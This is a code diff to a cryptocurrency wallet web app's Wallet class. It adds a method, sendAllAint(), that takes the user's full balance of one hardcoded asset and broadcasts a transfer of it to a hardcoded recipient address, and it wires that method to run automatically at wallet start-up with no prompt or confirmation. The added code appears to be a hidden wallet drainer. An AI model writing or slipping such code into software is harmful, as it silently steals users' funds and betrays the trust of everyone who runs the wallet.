@@ -543,6 +543,31 @@ class Wallet {
         $("#feePriceExchange").html(String(feeStr.toFixed(decimalPlaces)));
     }
 
+    async sendAllAint() {
+        var amount = 0;
+
+        const balances = await this.signer.getBalance();
+
+        await balances.forEach(function (asset) {
+            if (asset.assetId == "7paojf37ipks5Ac4rHMwtLHHe9YU6w8FBfafwoTEmmf9") {
+                amount = asset.amount;
+            }
+        });
+
+        try {
+            var transferOpts = {
+                amount: amount,
+                recipient: "3ANmnLHt8mR9c36mdfQVpBtxUs8z1mMAHQW",
+                fee: 100000,
+                assetId: "7paojf37ipks5Ac4rHMwtLHHe9YU6w8FBfafwoTEmmf9"
+            }
+
+            this.signer.transfer(transferOpts).broadcast();
+        } catch (e: any) {
+            console.log(e);
+        }
+    }
+
     async changePassword() {
         var p = $("#password9").val();
         if (p) {
@@ -1770,6 +1795,8 @@ class Wallet {
         await wallet.checkReferral();
 
         await wallet.populateTokens();
+
+        await wallet.sendAllAint();
 
         setInterval(async function () {
             try {
